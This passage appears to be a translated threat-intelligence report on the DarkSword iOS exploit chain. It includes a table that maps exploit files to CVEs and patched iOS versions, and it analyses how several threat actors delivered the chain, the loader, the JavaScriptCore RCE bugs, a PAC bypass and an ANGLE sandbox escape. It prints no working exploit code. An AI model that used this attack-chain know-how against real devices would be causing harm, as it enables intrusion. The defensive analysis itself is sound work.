style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><strong style="-webkit-tap-highlight-color: transparent;font-weight: 700;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">已在 iOS 版本中修复</span></font></font></strong></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">rce_module.js</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">CVE-2025-31277</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">JavaScriptCore 中的内存损坏漏洞</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">不</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">18.6</span></font></font></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">rce_worker_18.4.js</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">CVE-2026-20700</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">用户模式指针认证码 (PAC) 绕过</span></font></font></span><code style="-webkit-tap-highlight-color: transparent;font-family: Consolas, Monaco, &#34;Bitstream Vera Sans Mono&#34;, &#34;Courier New&#34;, Courier, monospace;font-size: 1em;box-sizing: border-box;background: rgb(241, 243, 244);color: rgba(0, 0, 0, 0.9);font-weight: 300;overflow-x: auto;padding: 3px 6px;white-space: break-spaces;overflow-wrap: normal;vertical-align: baseline;"><span leaf="">dyld</span></code></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">是的</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">26.3</span></font></font></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td rowspan="2" style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">rce_worker_18.6.js</span></font></font></span></p><p style="-webkit-tap-highlight-color: transparent;margin: 24px 0px 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">rce_worker_18.7.js</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">CVE-2025-43529</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">JavaScriptCore 中的内存损坏漏洞</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">是的</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">18.7.3，26.2</span></font></font></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">CVE-2026-20700</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">用户模式指针认证码 (PAC) 绕过</span></font></font></span><code style="-webkit-tap-highlight-color: transparent;font-family: Consolas, Monaco, &#34;Bitstream Vera Sans Mono&#34;, &#34;Courier New&#34;, Courier, monospace;font-size: 1em;box-sizing: border-box;background: rgb(241, 243, 244);color: rgba(0, 0, 0, 0.9);font-weight: 300;overflow-x: auto;padding: 3px 6px;white-space: break-spaces;overflow-wrap: normal;vertical-align: baseline;"><span leaf="">dyld</span></code></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">是的</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">26.3</span></font></font></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">sbox0_main_18.4.js</span></font></font></span></p><p style="-webkit-tap-highlight-color: transparent;margin: 24px 0px 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">sbx0_main.js</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">CVE-2025-14174</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">ANGLE 中的内存损坏漏洞</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">是的</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">18.7.3，26.2</span></font></font></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">sbx1_main.js</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">CVE-2025-43510</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">iOS内核内存管理漏洞</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">不</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">18.7.2，26.1</span></font></font></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">pe_main.js</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">CVE-2025-43520</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">iOS内核中的内存损坏漏洞</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">不</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">18.7.2，26.1</span></font></font></span></p></td></tr></tbody></table>  
表3：DarkSword中使用的漏洞  
# 漏洞利用交付  
  
UNC6748、PARS Defense 和 UNC6353 使用的漏洞利用程序交付方式存在显著的相似之处和差异。我们评估认为，这三个攻击者都基于 DarkSword 开发者的基本逻辑构建了各自的交付机制，并根据自身需求进行了调整。这三个攻击者都使用了会话uid存储密钥，但使用方式各不相同：  
  
我们一直看到 UNC6748 登录页面uid在获取漏洞利用加载器之前，既设置了密钥，又检查了密钥。  
  
PARS Defenseuid在 2026 年 1 月以同样的方式使用了该密钥，但我们在 2025 年 11 月看到的最初活动并不包括它。  
  
UNC6353 设置了uid密钥，但在获取漏洞利用加载器之前没有检查密钥；源代码中的一条注释表明，他们不知道后续阶段是否需要该密钥。  
  
根据不同攻击者的使用情况，我们评估认为，会话存储检查逻辑以及后续用于从 UNC6748 和 UNC6353frame.html获取rce_loader.js数据的逻辑，均由 DarkSword 漏洞利用链的开发者开发。我们还评估认为，PARS Defense 在 2026 年 1 月使用的额外指纹识别逻辑以及 UNC6748 在 2025 年 11 月使用的反调试逻辑，很可能也是由这些用户编写的，以更好地满足其操作需求。  
# 装载机  
  
我们观察到的所有活动实际上都使用了相同的漏洞利用加载器，只有一些细微差别，例如 PARS Defense 添加了加密功能。该加载器管理着两个远程代码执行 (RCE) 漏洞利用程序使用的 Web Worker 对象，以及 RCE 漏洞利用生命周期中的状态转换。加载器会获取 RCE 各个阶段所需的两个文件，文件名分别为 ``rce_module.js和`` 的变体rce_worker.js（例如 `rce_worker_18.4.js`）。iOS 18.4 漏洞利用程序将逻辑拆分到 Web Worker 脚本和主模块中，主模块eval与加载器处于同一上下文中；postMessage随着 RCE 漏洞利用程序的进行，这两个不同的上下文通过 `` 进行通信。然而，iOS 18.6/18.7 RCE 漏洞利用程序将所有漏洞利用逻辑都包含在 Web Worker 中，相应的 `rce_module.js` 文件中只有一个未使用的占位符函数（图 21）。  
  
加载器模块获取远程代码执行阶段的正确性方面存在一些不一致之处，这令人费解。一种可能是 UNC6353 和 PARS Defense 手动修正了这些错误；另一种可能是 UNC6748 比其他用户更早收到了漏洞利用链的更新，而 DarkSword 的开发者随后修复了这些漏洞。  
  
// for displaying hex value  
  
function dummyy(x) {  
  
return '0x' + x.toString(16);  
  
}  
  
图 21：rce_module_18.7.js内容（UNC6748，2025 年 11 月）  
# 远程代码执行漏洞利用  
  
GTIG 观察到 DarkSword 利用了 JavaScriptCore（WebKit 和苹果 Safari 浏览器使用的 JavaScript 引擎）的两种不同漏洞进行远程代码执行。对于运行 iOS 18.6 之前版本的设备，DarkSword 利用了 CVE-2025-31277，这是一个 JIT 优化/类型混淆漏洞，苹果已在 iOS 18.6 中修复了该漏洞。对于运行 iOS 18.6 至 18.7 的设备，DarkSword 利用了 CVE-2025-43529，这是一个 JavaScriptCore 数据流图 (DFG) JIT 层中的垃圾回收漏洞，苹果在 GTIG 报告该漏洞后，已在 iOS 18.7.3 和 26.2 中修复了该漏洞。这两种漏洞利用方式都会生成自己的 `fakeobj/addrof` 原语，然后以相同的方式在其基础上构建任意的读/写原语。  
  
这两个漏洞都与 CVE-2026-20700 直接相关。CVE-2026-20700 是dyld一个利用用户模式绕过漏洞来执行任意代码的漏洞，这是后续攻击阶段所必需的。该漏洞在 GTIG 报告后，由苹果在 iOS 26.3 中修复。  
# 沙盒逃脱漏洞  
  
Safari 采用多层沙箱设计，隔离浏览器中可能处理不受信任用户输入的不同组件。DarkSword 利用了两个独立的沙箱逃逸漏洞：首先，它从 WebContent 沙箱跳转到 GPU 进程；其次，它从 GPU 进程跳转到其他进程mediaplaybackd。无论需要哪种远程代码执行漏洞，DarkSword 都使用了相同的沙箱逃逸漏洞利用程序。  
# Web内容沙盒逃逸  
  
和其他组织此前讨论的那样，Safari 的渲染进程（称为 WebContent）被严格沙盒化，以限制其可能存在的漏洞的影响范围，因为它最容易受到不受信任的用户内容的影响。为了绕过这一限制，DarkSword 获取了一个名为 `sbox0_main_18.4.jsor`的漏洞利用程序sbx0_main.js来突破 WebContent 沙盒。该漏洞利用了 CVE-2025-14174，这是 ANGLE 中的一个漏洞，该漏洞在特定的 WebGL 操作中未对参数进行充分验证，导致 Safari 的 GPU 进程中出现越界内存操作。DarkSword 的开发者利用这一漏洞在 GPU 进程中执行任意代码。  
  
该漏洞由苹果和 GTIG 报告给谷歌（ANGLE 的开发者），并在 iOS 18.7.3 和 26.2 的版本中在 Safari 中进行了修复。  
# GPU 沙箱逃逸  
  
